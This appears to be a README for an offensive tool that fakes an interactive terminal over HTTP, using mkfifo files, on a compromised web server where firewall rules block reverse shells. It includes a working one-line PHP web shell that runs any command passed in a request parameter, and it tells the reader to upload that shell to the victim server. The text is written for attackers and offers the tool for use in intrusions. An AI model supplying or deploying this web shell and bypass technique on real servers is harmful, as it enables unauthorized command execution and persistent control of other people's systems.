--------------------------------------------
Sometimes when we compromise a web server, there are configured rules (**Ex: iptables**) that prevent us from obtaining a Reverse Shell via Netcat, Python, or another utility.

 With this tool, we avoid having to use a reverse shell to
 obtain a TTY later fully interactive.  Through files
 '**mkfifo**', we play to simulate an interactive TTY over HTTP, achieving
 manage the system comfortably without any type of problem.

 The only thing we need is to upload a PHP structure like the following to the compromised server to execute commands:
```php
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```

 After its execution, you'll have a tty that will allow you to execute commands that the firewall or other filters were filtering and will simulate commands like "cd.." or "pwd", to navigate between directories comfortably, JUST LIKE AN INTERACTIVE TTY!!
